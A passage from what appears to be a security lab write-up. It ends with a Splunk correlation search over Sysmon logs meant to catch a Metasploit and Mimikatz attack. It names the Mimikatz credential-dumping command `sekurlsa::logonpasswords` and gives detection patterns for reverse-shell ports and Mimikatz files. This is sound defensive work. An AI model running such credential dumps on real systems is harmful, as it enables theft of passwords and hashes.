   password/NTLM hash since it was exposed via `sekurlsa::logonpasswords`.
6. **Splunk correlation search** (example, generalized from §5.1) to catch this pattern
   automatically:

```spl
index=main sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational"
(EventCode=1 ParentImage="*\\explorer.exe" Image="*\\Downloads\\*.exe")
OR (EventCode=3 DestinationPort IN (4444,4443,8080))
OR (EventCode=11 TargetFilename="*mimikatz*")
| stats values(EventCode) as event_codes, values(Image) as images by ProcessGuid, User
| where mvcount(event_codes) > 1
```

---

*Document compiled from live lab captures: Metasploit console, Meterpreter/Mimikatz
output, Wireshark `payload.pcapng`, Windows Event Viewer (Sysmon Operational log), and
Splunk Enterprise 10.4.3 searches against `index=main`.*
